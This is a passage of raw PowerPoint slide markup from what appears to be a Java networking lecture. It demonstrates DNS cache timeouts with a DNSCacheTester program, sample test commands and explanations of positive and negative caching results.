                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("0")) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("- Cache disabled (both lookups hit DNS)");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        } else if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL.equals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("-1")) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("- Permanent caching (second lookup uses cache)");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        } else {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("- Temporary caching (" + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + "s TTL)");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="线形标注 1 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="9899782" y="685800"/>
            <a:ext cx="1676400" cy="476250"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val -6648"/>
              <a:gd name="adj2" fmla="val 1190"/>
              <a:gd name="adj3" fmla="val 52076"/>
              <a:gd name="adj4" fmla="val -407714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="952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600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pause Program</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="线形标注 1 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7695804" y="3200400"/>
            <a:ext cx="3880378" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val -6648"/>
              <a:gd name="adj2" fmla="val 1190"/>
              <a:gd name="adj3" fmla="val -168717"/>
              <a:gd name="adj4" fmla="val 10997"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="952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600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Create another </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>array using the same domain name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(args[0])</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="16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152400" y="923806"/>
            <a:ext cx="11963400" cy="578179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400" dirty="0"/>
              <a:t>Test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>: Execute the following command (set the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>cache timeout to 10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>seconds):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>DNSCacheTester</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> www.google.com 10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>DNS cache TTL set to 10 seconds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Operation result </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>( press any key within 10 secs) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Run result </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>( press any key after 10 sec)</a:t>
            </a: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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7066756" y="2640984"/>
            <a:ext cx="4687887" cy="3539430"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>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600" dirty="0"/>
              <a:t>Test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>1 may have two running results. If you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>press any key within 10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> seconds </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>after the "Press any key to continue </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>..." message appears, you will get running result 1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>From this result, we can see that the time used by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>addresses2 is 0 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>milliseconds, that is, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>addresses2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>did not actually access the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>DNS server, but directly </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>obtained data from cache</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>If you press any key to continue after 10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> seconds, you will get the running result 2. At this time, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>the data in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>the DNS cache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>in the memory has been released, so </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>addresses2 has to access the DNS server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>again . Therefore, the time for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>addresses2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>is 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>millisecond.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="313468" y="4486097"/>
            <a:ext cx="6011132" cy="2230065"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="2209800"/>
            <a:ext cx="5791200" cy="1896001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762000" y="217708"/>
            <a:ext cx="7274748" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Modify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cache programming example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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116013" y="160867"/>
            <a:ext cx="9959974" cy="838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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Modify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cache programming example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="914400"/>
            <a:ext cx="11517309" cy="2133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400" dirty="0"/>
              <a:t>Test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>: Execute the following command (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>cache timeout is set to never expire </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>[-1] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>www.google.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> -1</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Operation result </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>1 </a:t>
            </a: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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5855227" y="3157703"/>
            <a:ext cx="6248400" cy="3539430"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>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marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>After setting the DNS cache to never expire, addresses2 gets data from the DNS cache. No matter how much time passes, after pressing any key, addresses2 still gets the same IP address as address1, and the time of addresses2 is 0 milliseconds.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>If the domain name does not exist on the DNS server, the client will throw an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> after trying for a period of time (10 seconds on average). In order to avoid waiting the next time you access this domain name, the DNS cache also saves this error information.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>Only when you access the wrong domain name for the first time will you try for about 5 seconds. When you access this domain name again in the future, the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> will be thrown directly without waiting for another 5 seconds.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="2819399"/>
            <a:ext cx="4876800" cy="3007717"/>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P spid="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228600" y="1066800"/>
            <a:ext cx="11811000" cy="533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US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>When DNS lookups fail, Java caches these negative results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Default cache duration: 10 seconds (Java 8+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Controlled by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> property</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Values:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
